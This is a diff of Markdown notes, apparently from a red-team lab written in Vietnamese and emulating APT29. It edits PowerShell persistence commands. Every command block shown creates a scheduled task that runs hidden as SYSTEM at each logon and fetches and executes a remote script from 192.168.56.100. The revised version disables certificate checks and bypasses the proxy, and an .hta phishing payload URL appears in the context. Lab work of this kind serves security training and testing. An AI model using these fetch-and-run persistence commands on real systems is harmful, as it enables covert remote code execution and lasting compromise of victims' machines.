@@ -156,13 +156,14 @@ https://192.168.56.100:8443/phish/Invoice_October.hta
 ```ps1
 # Tạo task sau khi đã có revshell
 Register-ScheduledTask -TaskName "APT29LoginTask" -Force -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoP -W H -C "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.56.100:8000/login_handler.ps1'')"') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest)
+```
 
+```ps1
+Register-ScheduledTask -TaskName "LoginTask" -Force -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoP -W H -Exec Bypass -C "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString(''https://192.168.56.100:8443/login_handler.ps1'')"') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest)
+```
 
-Register-ScheduledTask -TaskName "APT29LoginTask" -Force -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoP -W H -Exec Bypass -C "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString(''https://192.168.56.100:8443/login_handler.ps1'')"') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest)
-
-# Ép task thực thi
-Start-ScheduledTask -TaskName "APT29LoginTask"
-
+```ps1
+Start-ScheduledTask -TaskName "LoginTask"
 ```
 
 ## 2. CHUẨN BỊ TRÊN MÁY CLIENT
